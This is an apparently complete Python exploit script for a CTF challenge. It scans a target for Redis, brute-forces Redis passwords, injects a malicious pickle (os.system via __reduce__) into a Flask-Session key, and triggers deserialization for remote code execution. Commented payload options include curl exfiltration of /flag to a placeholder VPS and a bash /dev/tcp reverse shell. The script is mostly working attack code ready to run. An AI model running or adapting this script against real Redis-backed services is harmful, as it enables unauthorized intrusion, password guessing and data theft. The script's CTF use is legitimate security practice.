#!/usr/bin/env python3
"""
Reference script for SWPU Deserialization Login challenge.
Attack chain: Redis access -> overwrite session pickle -> trigger deserialization -> RCE

Usage:
  python3 reference_redis_pickle_attack.py scan          # Scan for Redis ports
  python3 reference_redis_pickle_attack.py inject <port>  # Inject malicious pickle
  python3 reference_redis_pickle_attack.py inject <port> --password <pw>  # With auth
  python3 reference_redis_pickle_attack.py trigger        # Trigger deserialization
"""

import socket
import pickle
import os
import sys
import urllib.request
import hashlib
import base64
import time

# ===== CONFIG =====
TARGET_HOST = "9afe8399ae158e6e412a108c.http-ctf2.dasctf.com"
TARGET_URL = f"http://{TARGET_HOST}/"
# Our registered session cookie (UUID.signature)
SESSION_UUID = "3acb0294-63e8-4bc3-b29d-ea83b24ca836"
SESSION_COOKIE = f"{SESSION_UUID}.Xy40lRLeQcUj59eQHvjuFwUAT6U"
REDIS_KEY = f"session:{SESSION_UUID}"
# Flask-Session default key prefix is "session:"

# ===== PAYLOAD OPTIONS =====
# Option 1: curl exfiltration (if outbound allowed)
# VPS_IP = "YOUR_VPS_IP"
# VPS_PORT = 9999
# COMMAND = f"curl http://{VPS_IP}:{VPS_PORT}/?flag=$(cat /flag | base64)"

# Option 2: Write flag to static directory (if app is at /app/)
COMMAND = "cat /flag > /tmp/flag_output 2>/dev/null; cp /flag /app/static/flag.txt 2>/dev/null; ls /flag* /app/flag* 2>/dev/null"

# Option 3: Reverse shell (uncomment and set IP/PORT)
# RS_IP = "YOUR_VPS_IP"
# RS_PORT = 4444
# COMMAND = f"bash -c 'bash -i >& /dev/tcp/{RS_IP}/{RS_PORT} 0>&1'"

# Option 4: Write flag into a new Redis key for retrieval
# COMMAND = "redis-cli SET flag_result $(cat /flag)"  # Only works if redis-cli is on target


class PickleRCE:
    """Pickle RCE payload via __reduce__."""
    def __init__(self, cmd: str):
        self.cmd = cmd

    def __reduce__(self):
        return (os.system, (self.cmd,))


def generate_payload(cmd: str = COMMAND) -> bytes:
    """Generate malicious pickle payload."""
    return pickle.dumps(PickleRCE(cmd))


def redis_send(sock: socket.socket, *args) -> bytes:
    """Send a Redis RESP command and return response."""
    # Build RESP protocol
    parts = [f"*{len(args)}\r\n".encode()]
    for arg in args:
        if isinstance(arg, str):
            arg = arg.encode()
        parts.append(f"${len(arg)}\r\n".encode())
        parts.append(arg + b"\r\n")
    sock.send(b"".join(parts))
    time.sleep(0.5)
    return sock.recv(4096)


def scan_redis_ports(host: str, ports: list = None) -> list:
    """Scan common Redis ports on target host."""
    if ports is None:
        ports = [6379, 16379, 26379, 6380, 6381, 26380, 8080, 5000, 3000, 8888]
    open_ports = []
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((host, port))
            s.send(b"PING\r\n")
            resp = s.recv(1024)
            print(f"[+] Port {port}: OPEN - Response: {resp!r}")
            open_ports.append(port)
            s.close()
        except (socket.timeout, ConnectionRefusedError, OSError) as e:
            print(f"[-] Port {port}: {e}")
    return open_ports


def inject_pickle(host: str, port: int, password: str = None,
                  key: str = REDIS_KEY, cmd: str = COMMAND) -> bool:
    """Connect to Redis and inject malicious pickle into session key."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    try:
        s.connect((host, port))
        print(f"[+] Connected to Redis at {host}:{port}")
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        return False

    # Auth if needed
    if password:
        resp = redis_send(s, "AUTH", password)
        print(f"[*] AUTH response: {resp!r}")
        if b"OK" not in resp:
            print("[-] Auth failed")
            return False

    # Test with PING
    resp = redis_send(s, "PING")
    print(f"[*] PING response: {resp!r}")

    # Check existing keys
    resp = redis_send(s, "KEYS", "session:*")
    print(f"[*] Existing session keys: {resp!r}")

    # Generate payload
    payload = generate_payload(cmd)
    print(f"[*] Pickle payload size: {len(payload)} bytes")
    print(f"[*] Payload hex preview: {payload[:50].hex()}...")

    # Inject: SET session:{UUID} <pickle>
    # In RESP protocol, the pickle is binary, so we send it as a bulk string
    resp = redis_send(s, "SET", key, payload)
    print(f"[*] SET response: {resp!r}")

    if b"OK" in resp:
        print(f"[+] Successfully injected pickle into {key}")
        # Verify
        resp = redis_send(s, "GET", key)
        print(f"[*] GET verification (first 50 bytes): {resp[:50]!r}")
        s.close()
        return True
    else:
        print(f"[-] SET failed: {resp!r}")
        s.close()
        return False


def trigger_deserialization():
    """Trigger deserialization by visiting the page with our cookie."""
    print(f"[*] Triggering deserialization with cookie: session={SESSION_COOKIE}")
    req = urllib.request.Request(TARGET_URL)
    req.add_header("Cookie", f"session={SESSION_COOKIE}")
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        body = resp.read().decode(errors="replace")
        print(f"[+] Response status: {resp.status}")
        print(f"[+] Response body:\n{body}")
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors="replace")
        print(f"[*] HTTP {e.code}: {body}")
    except Exception as e:
        print(f"[-] Error: {e}")


def try_passwords(host: str, port: int, passwords: list = None) -> str:
    """Try common Redis passwords."""
    if passwords is None:
        passwords = [
            "", "redis", "password", "123456", "root", "admin",
            "redispw", "swpu", "deserialization", "redis123",
            "P@ssw0rd", "toor", "letmein", "qwerty",
        ]
    for pw in passwords:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        try:
            s.connect((host, port))
            if pw:
                s.send(f"AUTH {pw}\r\n".encode())
            else:
                s.send(b"PING\r\n")
            resp = s.recv(1024)
            s.close()
            if b"+OK" in resp or b"PONG" in resp:
                print(f"[+] Password found: '{pw}'")
                return pw
            print(f"[-] Password '{pw}': {resp.strip().decode(errors='replace')}")
        except Exception as e:
            print(f"[-] Password '{pw}': {e}")
    return None


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)

    action = sys.argv[1]

    if action == "scan":
        print(f"[*] Scanning {TARGET_HOST} for Redis ports...")
        ports = scan_redis_ports(TARGET_HOST)
        if ports:
            print(f"\n[+] Open Redis ports: {ports}")
        else:
            print("\n[-] No Redis ports found. Check if challenge provides an additional port.")

    elif action == "inject":
        port = int(sys.argv[2]) if len(sys.argv) > 2 else 6379
        password = None
        if "--password" in sys.argv:
            idx = sys.argv.index("--password")
            password = sys.argv[idx + 1]
        elif "--bruteforce" in sys.argv:
            password = try_passwords(TARGET_HOST, port)

        success = inject_pickle(TARGET_HOST, port, password)
        if success:
            print("\n[*] Now run: python3 reference_redis_pickle_attack.py trigger")

    elif action == "trigger":
        trigger_deserialization()

    elif action == "payload":
        # Just generate and print the payload
        payload = generate_payload()
        print(f"[*] Pickle payload (hex): {payload.hex()}")
        print(f"[*] Pickle payload (base64): {base64.b64encode(payload).decode()}")
        print(f"[*] Redis key: {REDIS_KEY}")

    elif action == "bruteforce":
        port = int(sys.argv[2]) if len(sys.argv) > 2 else 6379
        pw = try_passwords(TARGET_HOST, port)
        if pw:
            print(f"\n[*] Now run: python3 reference_redis_pickle_attack.py inject {port} --password {pw}")

    else:
        print(__doc__)
